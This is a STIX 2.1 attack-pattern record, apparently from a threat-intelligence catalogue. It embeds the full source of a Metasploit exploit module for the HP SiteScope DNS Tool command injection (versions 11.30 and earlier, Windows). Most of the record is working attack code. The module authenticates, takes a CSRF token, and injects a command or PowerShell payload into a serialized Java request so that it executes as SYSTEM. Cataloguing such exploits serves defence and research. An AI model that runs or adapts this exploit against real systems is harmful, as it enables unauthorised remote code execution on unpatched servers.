{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--093c3bec-fbe6-464c-819f-cf5f0191e2cf",
    "created": "2024-08-14T16:55:05.136174Z",
    "modified": "2024-08-14T16:55:05.136177Z",
    "name": "HP SiteScope DNS Tool Command Injection",
    "description": " This module exploits a command injection vulnerability discovered in HP SiteScope 11.30 and earlier versions (tested in 11.26 and 11.30). The vulnerability exists in the DNS Tool allowing an attacker to execute arbitrary commands in the context of the service. By default, HP SiteScope installs and runs as SYSTEM in Windows and does not require authentication. This vulnerability only exists on the Windows version. The Linux version is unaffected.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_sitescope_dns_tool.rb",
            "external_id": "hp_sitescope_dns_tool.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2015/10/09/r7-2015-17-hp-sitescope-dns-tool-command-injection"
        },
        {
            "source_name": "reference",
            "url": "http://www8.hp.com/us/en/software-solutions/sitescope-application-monitoring/index.html#vendorsite"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'HP SiteScope DNS Tool Command Injection',\n      'Description'    => %q{\n        This module exploits a command injection vulnerability\n        discovered in HP SiteScope 11.30 and earlier versions (tested in 11.26\n        and 11.30). The vulnerability exists in the DNS Tool allowing an\n        attacker to execute arbitrary commands in the context of the service. By\n        default, HP SiteScope installs and runs as SYSTEM in Windows and does\n        not require authentication. This vulnerability only exists on the\n        Windows version. The Linux version is unaffected.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Kirk Hayes', # @kirkphayes / Vulnerability Discovery and MSF module author\n          'Charles Riggs', # c0v3rt_chann3l / Vulnerability Discovery\n          'Juan Vazquez' # help with MSF module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://www.rapid7.com/blog/post/2015/10/09/r7-2015-17-hp-sitescope-dns-tool-command-injection'],\n          ['URL', 'http://www8.hp.com/us/en/software-solutions/sitescope-application-monitoring/index.html'] # vendor site\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'HP SiteScope 11.30 / Microsoft Windows 7 and higher',\n            {\n              'Arch' => [ARCH_X64, ARCH_X86]\n            }\n          ],\n          [ 'HP SiteScope 11.30 / CMD',\n            {\n              'Arch' => [ARCH_CMD]\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2015-10-09'))\n\n      register_options(\n        [\n          Opt::RPORT(8080),\n          OptString.new('SITE_SCOPE_USER', [false, 'Username for authentication', '']),\n          OptString.new('SITE_SCOPE_PASSWORD', [false, 'Password for authentication', '']),\n          OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])\n        ])\n    end\n\n  def exploit\n    initial_session = get_initial_session_id\n    redirect = authenticate(initial_session)\n    session = get_authenticated_session_id(initial_session, redirect)\n    csrf_token = get_csrf_token(session)\n\n    print_status(\"Executing payload\")\n    random_mark = Rex::Text.rand_text_alpha(5 + rand(5))\n    res = send_request_cgi(\n      {\n        'uri'      => normalize_uri(target_uri.path.to_s, 'remoteProxy'),\n        'method'   => 'POST',\n        'vars_get' => {\n          'OWASP_CSRFTOKEN' => csrf_token\n        },\n        'cookie'   => session,\n        'ctype'    => 'application/octet- serializable object',\n        'data'     => build_stream(random_mark)\n      }, 5)\n\n    if res && res.code == 200 && res.body\n      res_io = StringIO.new(res.body.to_s)\n      res_stream = Rex::Java::Serialization::Model::Stream.decode(res_io)\n      return if res_stream.nil?\n      show = false\n      res_stream.references.each do |ref|\n        if ref.class == Rex::Java::Serialization::Model::Utf && show\n          print_good(ref.contents)\n          next\n        elsif ref.class == Rex::Java::Serialization::Model::Utf && ref.contents.include?(random_mark)\n          show = true\n          next\n        end\n      end\n    end\n  end\n\n  def get_initial_session_id\n    print_status(\"Retrieving an initial JSESSIONID...\")\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path.to_s, 'servlet', 'Main'),\n      'method' => 'POST'\n    )\n\n    if res and res.code == 200 and res.get_cookies.include?('JSESSIONID')\n      session_id = res.get_cookies\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Retrieve of initial JSESSIONID failed\")\n    end\n\n    session_id\n  end\n\n  def authenticate(session_id)\n    print_status(\"Authenticating on HP SiteScope Configuration...\")\n    res = send_request_cgi(\n      {\n        'uri'       => normalize_uri(target_uri.path.to_s, 'j_security_check'),\n        'method'    => 'POST',\n        'cookie'    => session_id,\n        'vars_post' => {\n          'j_username' => datastore['SITE_SCOPE_USER'],\n          'j_password' => datastore['SITE_SCOPE_PASSWORD']\n        }\n      })\n\n    if res && res.code == 302\n      redirect =  URI(res.headers['Location']).path\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication on SiteScope failed\")\n    end\n\n    redirect\n  end\n\n  def get_authenticated_session_id(session_id, redirect)\n    print_status(\"Following redirection to finish authentication...\")\n\n    res = send_request_cgi(\n      {\n        'uri' => redirect,\n        'method' => 'GET',\n        'cookie' => session_id\n      })\n\n    if res && res.code == 200 && res.get_cookies.include?('JSESSIONID')\n      auth_session = res.get_cookies\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication on SiteScope failed\")\n    end\n\n    auth_session\n  end\n\n  def get_csrf_token(session)\n    print_status(\"Getting anti-CSRF token...\")\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path.to_s, 'jsp', 'tabs.jsp'),\n      'cookie' => session\n    )\n\n    if res && res.code == 302 && res.headers['Location'] =~ /OWASP_CSRFTOKEN=([A-Z0-9\\-]+)/\n      csrf_token = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Failed to get anti-CSRF token\")\n    end\n\n    csrf_token\n  end\n\n  def build_stream(random_mark)\n    site = \"google.com & echo #{random_mark} & \"\n    if target.arch.include?('cmd')\n      command = payload.encoded\n    else\n      command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)\n    end\n\n    file = File.join( Msf::Config.data_directory, 'exploits', 'R7_2015_17', 'stream.raw')\n\n    f = File.new(file, 'rb')\n    stream = Rex::Java::Serialization::Model::Stream.decode(f)\n    f.close\n\n    dns_param = stream.references[0x44]\n    dns_param.contents = site + command\n    dns_param.length = dns_param.contents.length\n\n    stream.encode\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-10-09",
    "x_mitre_platforms": [
        "win'"
    ]
}